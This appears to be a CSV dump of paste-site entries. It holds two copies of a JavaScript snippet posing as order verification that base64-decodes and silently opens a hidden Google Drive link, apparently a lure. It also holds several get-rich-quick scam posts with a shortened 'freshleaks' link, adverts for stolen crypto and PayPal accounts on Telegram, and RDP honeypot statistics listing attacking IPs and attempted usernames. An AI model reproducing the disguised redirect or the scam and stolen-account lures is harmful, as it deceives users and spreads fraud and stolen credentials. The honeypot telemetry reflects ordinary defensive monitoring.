id,title,username,language,date,content
MAxgzmjW,Market.js,kammex,JavaScript,Monday 28th of April 2025 07:19:45 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/57136/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4ktQk2gT,2025-04-28_stats.json,rdp_snitch,JSON,Monday 28th of April 2025 07:18:25 PM CDT,"{
  ""ip"": {
    ""161.97.77.37"": 13671,
    ""159.89.6.147"": 3330,
    ""211.185.207.14"": 60,
    ""71.82.170.60"": 21,
    ""80.94.95.198"": 30,
    ""205.210.31.220"": 9,
    ""111.89.163.100"": 27,
    ""193.176.22.13"": 24,
    ""45.227.254.130"": 9,
    ""88.214.25.121"": 6,
    ""157.245.104.150"": 3,
    ""45.227.254.151"": 6,
    ""88.214.50.50"": 36,
    ""167.99.148.88"": 12,
    ""80.94.95.90"": 6,
    ""45.79.0.24"": 3,
    ""62.60.188.24"": 9,
    ""198.235.24.216"": 9,
    ""102.88.21.212"": 3,
    ""102.88.21.214"": 3,
    ""196.25.93.44"": 3,
    ""23.92.31.45"": 12,
    ""45.33.120.129"": 3,
    ""221.181.44.30"": 6,
    ""205.210.31.110"": 9,
    ""191.252.2.116"": 555,
    ""173.230.129.193"": 72,
    ""165.154.138.85"": 3,
    ""181.30.39.44"": 6,
    ""143.198.126.238"": 513,
    ""171.254.94.252"": 3,
    ""89.248.161.40"": 3,
    ""91.238.181.96"": 6,
    ""92.53.15.159"": 3,
    ""198.235.24.95"": 9,
    ""194.165.16.166"": 6,
    ""103.97.93.115"": 27
  },
  ""asn"": {
    ""AS51167"": 13671,
    ""AS14061"": 3858,
    ""AS4766"": 60,
    ""AS20115"": 21,
    ""AS204428"": 36,
    ""AS396982"": 36,
    ""AS2514"": 27,
    ""Unknown"": 60,
    ""AS267784"": 15,
    ""AS35042"": 6,
    ""AS63949"": 90,
    ""AS215930"": 9,
    ""AS29465"": 6,
    ""AS5713"": 3,
    ""AS9808"": 6,
    ""AS27715"": 555,
    ""AS135377"": 3,
    ""AS7303"": 6,
    ""AS7552"": 3,
    ""AS202425"": 3,
    ""AS49434"": 6,
    ""AS43612"": 3,
    ""AS48721"": 6,
    ""AS134053"": 27
  },
  ""isp"": {
    ""Contabo GmbH"": 13671,
    ""DigitalOcean, LLC"": 3858,
    ""Korea Telecom"": 60,
    ""Charter Communications"": 21,
    ""SS-Net"": 36,
    ""Google LLC"": 36,
    ""NTT PC Communications, Inc."": 27,
    ""SIA \""Singularity Telecom\"""": 60,
    ""Flyservers S.A."": 21,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Akamai Technologies, Inc."": 90,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 9,
    ""MTN NIGERIA Communication limited"": 6,
    ""Telkom SA Ltd."": 3,
    ""China Mobile communications corporation"": 6,
    ""Locaweb Servi\u00e7os de Internet S/A"": 555,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Telecom Argentina S.A"": 6,
    ""Viettel Corporation"": 3,
    ""IP Volume inc"": 3,
    ""Datacenter location PAR1 France"": 6,
    ""CableTEL DOOEL Macedonia Veles Triple Play"": 3,
    ""Ethernet Xpress Pvt. Ltd."": 27
  },
  ""org"": {
    ""Contabo GmbH"": 13671,
    ""DigitalOcean, LLC"": 3846,
    ""Kornet"": 60,
    ""Spectrum"": 21,
    ""Unmanaged LTD"": 36,
    ""Palo Alto Networks, Inc"": 36,
    ""InfoSphere"": 27,
    ""SIA \""Singularity Telecom\"""": 60,
    ""Xwin Universal LTD"": 15,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Digital Ocean"": 12,
    ""Linode"": 90,
    ""UAB Host Baltic"": 9,
    ""MTN Nigeria"": 6,
    ""Netline"": 3,
    ""China Mobile"": 6,
    ""Locaweb Servi\u00e7os de Internet S/A"": 555,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Fibertel"": 6,
    ""VIETEL"": 3,
    ""IP Volume inc"": 3,
    ""Global Communication Net EAD"": 3,
    ""Flyservers S.A"": 6,
    ""Ethernet Xpress Pvt. Ltd."": 27
  },
  ""regionName"": {
    ""Grand Est"": 13671,
    ""Hesse"": 3333,
    ""Sejong-si"": 60,
    ""Wisconsin"": 21,
    ""Budapest"": 36,
    ""California"": 36,
    ""Tokyo"": 27,
    ""New York"": 60,
    ""Vilnius"": 15,
    ""Kowloon City"": 6,
    ""Karnataka"": 3,
    ""New Jersey"": 525,
    ""Texas"": 6,
    ""Tehran"": 9,
    ""Lagos"": 6,
    ""Eastern Cape"": 3,
    ""Georgia"": 84,
    ""Guangdong"": 6,
    ""S\u00e3o Paulo"": 555,
    ""Buenos Aires F.D."": 6,
    ""Hanoi"": 3,
    ""North Holland"": 3,
    ""\u00cele-de-France"": 6,
    ""Grad Skopje"": 3,
    ""Kaunas"": 6,
    ""Goa"": 27
  },
  ""country"": {
    ""France"": 13677,
    ""Germany"": 3333,
    ""South Korea"": 60,
    ""United States"": 732,
    ""Hungary"": 36,
    ""Japan"": 27,
    ""Lithuania"": 21,
    ""Hong Kong"": 6,
    ""India"": 30,
    ""Iran"": 9,
    ""Nigeria"": 6,
    ""South Africa"": 3,
    ""China"": 6,
    ""Brazil"": 555,
    ""Argentina"": 6,
    ""Vietnam"": 3,
    ""The Netherlands"": 3,
    ""North Macedonia"": 3
  },
  ""account"": {
    ""hello"": 18207,
    ""142.93.8.59"": 138,
    ""hjwhOhnVj"": 3,
    ""kbIDuH"": 3,
    ""VcsEHn"": 3,
    ""Test"": 36,
    ""Domain"": 57,
    ""h31icym2"": 12,
    ""Administr"": 6,
    ""beio"": 6,
    ""jbeibeUQW"": 3,
    ""kFoEBY"": 3,
    ""GqZuup"": 3,
    ""hdiu0oy2"": 12,
    ""shacOjApK"": 3,
    ""mRLosF"": 3,
    ""fBoDMC"": 3,
    ""Administrator"": 3,
    ""(empty)"": 3,
    ""WsJJyKasv"": 3,
    ""tUOHfh"": 3,
    ""JwPnUG"": 3
  },
  ""keyboard"": {
    ""Unknown"": 18516
  },
  ""client_build"": {
    ""Unknown"": 18516
  },
  ""client_name"": {
    ""Unknown"": 18516
  },
  ""ip_type"": {
    ""hosting"": 18216,
    ""Unknown"": 285,
    ""hosting & proxy"": 3,
    ""mobile & hosting"": 6,
    ""mobile"": 6
  }
}"
YiDhw3Rk,Make $1000 15-MINUTES (BEGINNER) L4,idk78909,JavaScript,Monday 28th of April 2025 07:17:28 PM CDT," 
Pdf https://tinyurl.com/freshleaks

DqXtou9NLS
"
7QtfFeAY,Crypto Accounts,dentira,JavaScript,Monday 28th of April 2025 07:16:24 PM CDT,39000 Accounts Posted On https://t.me/leakzbyeminem
H8zgB6wM,2025-04-28_stats.json,rdp_snitch,JSON,Monday 28th of April 2025 07:16:13 PM CDT,"{
  ""ip"": {
    ""161.97.77.37"": 9114,
    ""159.89.6.147"": 2220,
    ""211.185.207.14"": 40,
    ""71.82.170.60"": 14,
    ""80.94.95.198"": 20,
    ""205.210.31.220"": 6,
    ""111.89.163.100"": 18,
    ""193.176.22.13"": 16,
    ""45.227.254.130"": 6,
    ""88.214.25.121"": 4,
    ""157.245.104.150"": 2,
    ""45.227.254.151"": 4,
    ""88.214.50.50"": 24,
    ""167.99.148.88"": 8,
    ""80.94.95.90"": 4,
    ""45.79.0.24"": 2,
    ""62.60.188.24"": 6,
    ""198.235.24.216"": 6,
    ""102.88.21.212"": 2,
    ""102.88.21.214"": 2,
    ""196.25.93.44"": 2,
    ""23.92.31.45"": 8,
    ""45.33.120.129"": 2,
    ""221.181.44.30"": 4,
    ""205.210.31.110"": 6,
    ""191.252.2.116"": 370,
    ""173.230.129.193"": 48,
    ""165.154.138.85"": 2,
    ""181.30.39.44"": 4,
    ""143.198.126.238"": 342,
    ""171.254.94.252"": 2,
    ""89.248.161.40"": 2,
    ""91.238.181.96"": 4,
    ""92.53.15.159"": 2,
    ""198.235.24.95"": 6,
    ""194.165.16.166"": 4,
    ""103.97.93.115"": 18
  },
  ""asn"": {
    ""AS51167"": 9114,
    ""AS14061"": 2572,
    ""AS4766"": 40,
    ""AS20115"": 14,
    ""AS204428"": 24,
    ""AS396982"": 24,
    ""AS2514"": 18,
    ""Unknown"": 40,
    ""AS267784"": 10,
    ""AS35042"": 4,
    ""AS63949"": 60,
    ""AS215930"": 6,
    ""AS29465"": 4,
    ""AS5713"": 2,
    ""AS9808"": 4,
    ""AS27715"": 370,
    ""AS135377"": 2,
    ""AS7303"": 4,
    ""AS7552"": 2,
    ""AS202425"": 2,
    ""AS49434"": 4,
    ""AS43612"": 2,
    ""AS48721"": 4,
    ""AS134053"": 18
  },
  ""isp"": {
    ""Contabo GmbH"": 9114,
    ""DigitalOcean, LLC"": 2572,
    ""Korea Telecom"": 40,
    ""Charter Communications"": 14,
    ""SS-Net"": 24,
    ""Google LLC"": 24,
    ""NTT PC Communications, Inc."": 18,
    ""SIA \""Singularity Telecom\"""": 40,
    ""Flyservers S.A."": 14,
    ""NOC EMAIL: noc@one-host.net"": 4,
    ""Akamai Technologies, Inc."": 60,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 6,
    ""MTN NIGERIA Communication limited"": 4,
    ""Telkom SA Ltd."": 2,
    ""China Mobile communications corporation"": 4,
    ""Locaweb Servi\u00e7os de Internet S/A"": 370,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Telecom Argentina S.A"": 4,
    ""Viettel Corporation"": 2,
    ""IP Volume inc"": 2,
    ""Datacenter location PAR1 France"": 4,
    ""CableTEL DOOEL Macedonia Veles Triple Play"": 2,
    ""Ethernet Xpress Pvt. Ltd."": 18
  },
  ""org"": {
    ""Contabo GmbH"": 9114,
    ""DigitalOcean, LLC"": 2564,
    ""Kornet"": 40,
    ""Spectrum"": 14,
    ""Unmanaged LTD"": 24,
    ""Palo Alto Networks, Inc"": 24,
    ""InfoSphere"": 18,
    ""SIA \""Singularity Telecom\"""": 40,
    ""Xwin Universal LTD"": 10,
    ""ThinkTech Technology Industrial CO. Limited"": 8,
    ""Digital Ocean"": 8,
    ""Linode"": 60,
    ""UAB Host Baltic"": 6,
    ""MTN Nigeria"": 4,
    ""Netline"": 2,
    ""China Mobile"": 4,
    ""Locaweb Servi\u00e7os de Internet S/A"": 370,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Fibertel"": 4,
    ""VIETEL"": 2,
    ""IP Volume inc"": 2,
    ""Global Communication Net EAD"": 2,
    ""Flyservers S.A"": 4,
    ""Ethernet Xpress Pvt. Ltd."": 18
  },
  ""regionName"": {
    ""Grand Est"": 9114,
    ""Hesse"": 2222,
    ""Sejong-si"": 40,
    ""Wisconsin"": 14,
    ""Budapest"": 24,
    ""California"": 24,
    ""Tokyo"": 18,
    ""New York"": 40,
    ""Vilnius"": 10,
    ""Kowloon City"": 4,
    ""Karnataka"": 2,
    ""New Jersey"": 350,
    ""Texas"": 4,
    ""Tehran"": 6,
    ""Lagos"": 4,
    ""Eastern Cape"": 2,
    ""Georgia"": 56,
    ""Guangdong"": 4,
    ""S\u00e3o Paulo"": 370,
    ""Buenos Aires F.D."": 4,
    ""Hanoi"": 2,
    ""North Holland"": 2,
    ""\u00cele-de-France"": 4,
    ""Grad Skopje"": 2,
    ""Kaunas"": 4,
    ""Goa"": 18
  },
  ""country"": {
    ""France"": 9118,
    ""Germany"": 2222,
    ""South Korea"": 40,
    ""United States"": 488,
    ""Hungary"": 24,
    ""Japan"": 18,
    ""Lithuania"": 14,
    ""Hong Kong"": 4,
    ""India"": 20,
    ""Iran"": 6,
    ""Nigeria"": 4,
    ""South Africa"": 2,
    ""China"": 4,
    ""Brazil"": 370,
    ""Argentina"": 4,
    ""Vietnam"": 2,
    ""The Netherlands"": 2,
    ""North Macedonia"": 2
  },
  ""account"": {
    ""hello"": 12138,
    ""142.93.8.59"": 92,
    ""hjwhOhnVj"": 2,
    ""kbIDuH"": 2,
    ""VcsEHn"": 2,
    ""Test"": 24,
    ""Domain"": 38,
    ""h31icym2"": 8,
    ""Administr"": 4,
    ""beio"": 4,
    ""jbeibeUQW"": 2,
    ""kFoEBY"": 2,
    ""GqZuup"": 2,
    ""hdiu0oy2"": 8,
    ""shacOjApK"": 2,
    ""mRLosF"": 2,
    ""fBoDMC"": 2,
    ""Administrator"": 2,
    ""(empty)"": 2,
    ""WsJJyKasv"": 2,
    ""tUOHfh"": 2,
    ""JwPnUG"": 2
  },
  ""keyboard"": {
    ""Unknown"": 12344
  },
  ""client_build"": {
    ""Unknown"": 12344
  },
  ""client_name"": {
    ""Unknown"": 12344
  },
  ""ip_type"": {
    ""hosting"": 12144,
    ""Unknown"": 190,
    ""hosting & proxy"": 2,
    ""mobile & hosting"": 4,
    ""mobile"": 4
  }
}"
GrXMV6wW,2025-04-28_stats.json,rdp_snitch,JSON,Monday 28th of April 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""161.97.77.37"": 4557,
    ""159.89.6.147"": 1110,
    ""211.185.207.14"": 20,
    ""71.82.170.60"": 7,
    ""80.94.95.198"": 10,
    ""205.210.31.220"": 3,
    ""111.89.163.100"": 9,
    ""193.176.22.13"": 8,
    ""45.227.254.130"": 3,
    ""88.214.25.121"": 2,
    ""157.245.104.150"": 1,
    ""45.227.254.151"": 2,
    ""88.214.50.50"": 12,
    ""167.99.148.88"": 4,
    ""80.94.95.90"": 2,
    ""45.79.0.24"": 1,
    ""62.60.188.24"": 3,
    ""198.235.24.216"": 3,
    ""102.88.21.212"": 1,
    ""102.88.21.214"": 1,
    ""196.25.93.44"": 1,
    ""23.92.31.45"": 4,
    ""45.33.120.129"": 1,
    ""221.181.44.30"": 2,
    ""205.210.31.110"": 3,
    ""191.252.2.116"": 185,
    ""173.230.129.193"": 24,
    ""165.154.138.85"": 1,
    ""181.30.39.44"": 2,
    ""143.198.126.238"": 171,
    ""171.254.94.252"": 1,
    ""89.248.161.40"": 1,
    ""91.238.181.96"": 2,
    ""92.53.15.159"": 1,
    ""198.235.24.95"": 3,
    ""194.165.16.166"": 2,
    ""103.97.93.115"": 9
  },
  ""asn"": {
    ""AS51167"": 4557,
    ""AS14061"": 1286,
    ""AS4766"": 20,
    ""AS20115"": 7,
    ""AS204428"": 12,
    ""AS396982"": 12,
    ""AS2514"": 9,
    ""Unknown"": 20,
    ""AS267784"": 5,
    ""AS35042"": 2,
    ""AS63949"": 30,
    ""AS215930"": 3,
    ""AS29465"": 2,
    ""AS5713"": 1,
    ""AS9808"": 2,
    ""AS27715"": 185,
    ""AS135377"": 1,
    ""AS7303"": 2,
    ""AS7552"": 1,
    ""AS202425"": 1,
    ""AS49434"": 2,
    ""AS43612"": 1,
    ""AS48721"": 2,
    ""AS134053"": 9
  },
  ""isp"": {
    ""Contabo GmbH"": 4557,
    ""DigitalOcean, LLC"": 1286,
    ""Korea Telecom"": 20,
    ""Charter Communications"": 7,
    ""SS-Net"": 12,
    ""Google LLC"": 12,
    ""NTT PC Communications, Inc."": 9,
    ""SIA \""Singularity Telecom\"""": 20,
    ""Flyservers S.A."": 7,
    ""NOC EMAIL: noc@one-host.net"": 2,
    ""Akamai Technologies, Inc."": 30,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 3,
    ""MTN NIGERIA Communication limited"": 2,
    ""Telkom SA Ltd."": 1,
    ""China Mobile communications corporation"": 2,
    ""Locaweb Servi\u00e7os de Internet S/A"": 185,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Telecom Argentina S.A"": 2,
    ""Viettel Corporation"": 1,
    ""IP Volume inc"": 1,
    ""Datacenter location PAR1 France"": 2,
    ""CableTEL DOOEL Macedonia Veles Triple Play"": 1,
    ""Ethernet Xpress Pvt. Ltd."": 9
  },
  ""org"": {
    ""Contabo GmbH"": 4557,
    ""DigitalOcean, LLC"": 1282,
    ""Kornet"": 20,
    ""Spectrum"": 7,
    ""Unmanaged LTD"": 12,
    ""Palo Alto Networks, Inc"": 12,
    ""InfoSphere"": 9,
    ""SIA \""Singularity Telecom\"""": 20,
    ""Xwin Universal LTD"": 5,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""Digital Ocean"": 4,
    ""Linode"": 30,
    ""UAB Host Baltic"": 3,
    ""MTN Nigeria"": 2,
    ""Netline"": 1,
    ""China Mobile"": 2,
    ""Locaweb Servi\u00e7os de Internet S/A"": 185,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Fibertel"": 2,
    ""VIETEL"": 1,
    ""IP Volume inc"": 1,
    ""Global Communication Net EAD"": 1,
    ""Flyservers S.A"": 2,
    ""Ethernet Xpress Pvt. Ltd."": 9
  },
  ""regionName"": {
    ""Grand Est"": 4557,
    ""Hesse"": 1111,
    ""Sejong-si"": 20,
    ""Wisconsin"": 7,
    ""Budapest"": 12,
    ""California"": 12,
    ""Tokyo"": 9,
    ""New York"": 20,
    ""Vilnius"": 5,
    ""Kowloon City"": 2,
    ""Karnataka"": 1,
    ""New Jersey"": 175,
    ""Texas"": 2,
    ""Tehran"": 3,
    ""Lagos"": 2,
    ""Eastern Cape"": 1,
    ""Georgia"": 28,
    ""Guangdong"": 2,
    ""S\u00e3o Paulo"": 185,
    ""Buenos Aires F.D."": 2,
    ""Hanoi"": 1,
    ""North Holland"": 1,
    ""\u00cele-de-France"": 2,
    ""Grad Skopje"": 1,
    ""Kaunas"": 2,
    ""Goa"": 9
  },
  ""country"": {
    ""France"": 4559,
    ""Germany"": 1111,
    ""South Korea"": 20,
    ""United States"": 244,
    ""Hungary"": 12,
    ""Japan"": 9,
    ""Lithuania"": 7,
    ""Hong Kong"": 2,
    ""India"": 10,
    ""Iran"": 3,
    ""Nigeria"": 2,
    ""South Africa"": 1,
    ""China"": 2,
    ""Brazil"": 185,
    ""Argentina"": 2,
    ""Vietnam"": 1,
    ""The Netherlands"": 1,
    ""North Macedonia"": 1
  },
  ""account"": {
    ""hello"": 6069,
    ""142.93.8.59"": 46,
    ""hjwhOhnVj"": 1,
    ""kbIDuH"": 1,
    ""VcsEHn"": 1,
    ""Test"": 12,
    ""Domain"": 19,
    ""h31icym2"": 4,
    ""Administr"": 2,
    ""beio"": 2,
    ""jbeibeUQW"": 1,
    ""kFoEBY"": 1,
    ""GqZuup"": 1,
    ""hdiu0oy2"": 4,
    ""shacOjApK"": 1,
    ""mRLosF"": 1,
    ""fBoDMC"": 1,
    ""Administrator"": 1,
    ""(empty)"": 1,
    ""WsJJyKasv"": 1,
    ""tUOHfh"": 1,
    ""JwPnUG"": 1
  },
  ""keyboard"": {
    ""Unknown"": 6172
  },
  ""client_build"": {
    ""Unknown"": 6172
  },
  ""client_name"": {
    ""Unknown"": 6172
  },
  ""ip_type"": {
    ""hosting"": 6072,
    ""Unknown"": 95,
    ""hosting & proxy"": 1,
    ""mobile & hosting"": 2,
    ""mobile"": 2
  }
}"
yG4Rc24e,EARN $900 INSTANTLY 2025⭐ GV,idk78909,JavaScript,Monday 28th of April 2025 07:08:14 PM CDT," 
Pdf https://tinyurl.com/freshleaks

nRBZ6b3zr3
"
2VJh8Uvw,Untitled,kammex,JavaScript,Monday 28th of April 2025 07:04:23 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/16274/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iSMECfnt,PayPal with Balance,dentira,JavaScript,Monday 28th of April 2025 07:01:02 PM CDT,69287 Accounts Posted On https://t.me/leakzbyeminem
vVqVKr49,Make $1000 15-MINUTES  (BEGINNER) YR,idk78909,JavaScript,Monday 28th of April 2025 06:59:00 PM CDT," 
Pdf https://tinyurl.com/freshleaks

zDPRsNeVGW
"
